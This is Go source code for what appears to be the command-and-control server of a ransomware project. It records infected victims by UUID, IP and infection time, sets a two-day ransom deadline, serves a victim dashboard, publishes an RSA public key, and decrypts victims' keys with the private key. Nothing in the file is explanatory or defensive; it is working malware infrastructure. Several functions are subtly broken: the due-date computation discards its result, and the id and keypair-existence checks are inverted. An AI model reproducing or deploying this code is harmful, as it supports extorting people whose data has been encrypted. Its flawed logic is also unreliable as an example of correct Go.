package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/joho/godotenv"
	"github.com/nireo/gocry/server/gen_rsa"
	uuid "github.com/satori/go.uuid"
	"gorm.io/driver/postgres"
	"gorm.io/gorm"
)

var db *gorm.DB

func GiveTransactionID(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("your transaction id"))
}

func DecryptKey(w http.ResponseWriter, r *http.Request) {
	key, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "error reading request body", http.StatusInternalServerError)
		return
	}

	pemd, err := ioutil.ReadFile("private.pem")
	if err != nil {
		http.Error(w, "error reading rsa private key", http.StatusInternalServerError)
		return
	}

	block, _ := pem.Decode(pemd)
	if block == nil {
		log.Fatalf("bad key data: %s", "not PEM-encoded")
	}
	if got, want := block.Type, "RSA PRIVATE KEY"; got != want {
		log.Fatalf("unknown key type %q, want %q", got, want)
	}

	// Decode the RSA private key
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		log.Fatalf("bad private key: %s", err)
	}

	uuid, err := uuid.NewV4()
	if err != nil {
		log.Fatalf("error generating uuid for key: %s", err)
		return
	}

	out, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, key, []byte("encrypted-key-"+uuid.String()))
	if err != nil {
		log.Fatalf("decrypt: %s", err)
	}

	w.Write(out)
}

// takes in the starting time of the ransom and adds 2 days to it.
func getDueDate(timestamp int64) int64 {
	tm := time.Unix(timestamp, 0)
	tm.Add(time.Hour * 24 * 2)

	return tm.Unix()
}

type victimHtmlDisplay struct {
	Count   int
	Victims []Victim
}

func ServeVictimsDisplay(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")

	var victims []Victim
	db.Find(&victims)

	htmlDisplay := &victimHtmlDisplay{
		Count:   len(victims),
		Victims: victims,
	}

	tmpl := template.Must(template.ParseFiles("./templates/victims.html"))
	if err := tmpl.Execute(w, htmlDisplay); err != nil {
		http.Error(w, fmt.Sprintf("could not execute html template: %s", err), http.StatusInternalServerError)
		return
	}
}

func GetRSAPubKey(w http.ResponseWriter, r *http.Request) {
	data, err := ioutil.ReadFile("./public.pem")
	if err != nil {
		http.Error(w, fmt.Sprintf("could not get rsa public key: %s", err),
			http.StatusInternalServerError)
	}

	// w.Header().Set("Content-Type", "text/plain")
	w.Write(data)
}

type Victim struct {
	gorm.Model
	UUID      string `json:"uuid"` // A unique id used to identify the victim
	IP        string `json:"ip"`
	Timestamp int64  `json:"timestamp"` // A timestamp of the infection
	Completed bool   `json:"completed"` // A indicator if the transaction has been payed.
	DueDate   int64  `json:"due_date"`  // timestamp but with two days added
}

type newVictim struct {
	UUID      string `json:"uuid"`
	IP        string `json:"ip"`
	Timestamp int64  `json:"timestamp"`
}

func RegisterNewVictim(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	if r.Header.Get("Content-Type") != "application/json" {
		http.Error(w, fmt.Sprintf("wrong content type, wanted: application/json, got: %s",
			r.Header.Get("Content-Type")), http.StatusBadRequest)
		return
	}

	// parse json data from the request
	var victimData newVictim
	if err := json.NewDecoder(r.Body).Decode(&victimData); err != nil {
		http.Error(w, fmt.Sprintf("could not parse request body json data: %s", err),
			http.StatusInternalServerError)
		return
	}

	// The uuid is created on the client-side, since then the client also easily knows
	// its own uuid.

	victim := &Victim{
		UUID:      victimData.UUID,
		Timestamp: victimData.Timestamp,
		IP:        victimData.IP,
		Completed: false,
		DueDate:   getDueDate(victimData.Timestamp),
	}

	log.Printf("new victim registered, ID: %s, IP: %s", victim.UUID, victim.IP)
	db.Create(victim)
	w.WriteHeader(http.StatusOK)
}

func GetRansomwareDueDate(w http.ResponseWriter, r *http.Request) {
	uuid := r.URL.Query().Get("id")
	if uuid != "" {
		http.Error(w, "no id query provided", http.StatusBadRequest)
		return
	}

	var victim Victim
	if err := db.Where(&Victim{UUID: uuid}).First(&victim).Error; err != nil {
		http.Error(w, "victim data not found", http.StatusNotFound)
		return
	}

	tm := time.Unix(victim.DueDate, 0)

	w.Write([]byte(tm.String()))
}

func main() {

	// Load environment variables, such that we can take database parameters
	if err := godotenv.Load(); err != nil {
		log.Fatalf("could not load environment variables: %s", err)
	}

	dbHost := os.Getenv("db_host")
	dbPort := os.Getenv("db_port")
	dbUser := os.Getenv("db_user")
	dbName := os.Getenv("db_name")

	var err error
	db, err = gorm.Open(postgres.New(postgres.Config{
		DSN: fmt.Sprintf("host=%s port=%s user=%s dbname=%s sslmode=disable",
			dbHost, dbPort, dbUser, dbName),
	}), &gorm.Config{})

	if err != nil {
		log.Fatalf("could not establish a database connection: %s", err)
	}

	// always migrate the victim model
	db.AutoMigrate(&Victim{})

	// This is mostly just for debugging purposes
	if len(os.Args) == 2 && os.Args[1] == "remove_data" {
		var victims []Victim
		db.Find(&victims)
		for _, victim := range victims {
			db.Delete(victim)
		}

		return
	}

	// ensure that a rsa keypair has been generated.
	if _, err := os.Stat("./public.pem"); !os.IsNotExist(err) {
		gen_rsa.GenerateRSAKeypair()
	}

	if _, err := os.Stat("./private.pem"); !os.IsNotExist(err) {
		gen_rsa.GenerateRSAKeypair()
	}

	http.HandleFunc("/get_transaction", GiveTransactionID)
	http.HandleFunc("/pubkey", GetRSAPubKey)
	http.HandleFunc("/register", RegisterNewVictim)
	http.HandleFunc("/dashboard", ServeVictimsDisplay)
	http.HandleFunc("/due", GetRansomwareDueDate)

	if err := http.ListenAndServe("127.0.0.1:8080", nil); err != nil {
		log.Fatalf("error while running listenandserver: %s", err.Error())
	}
}
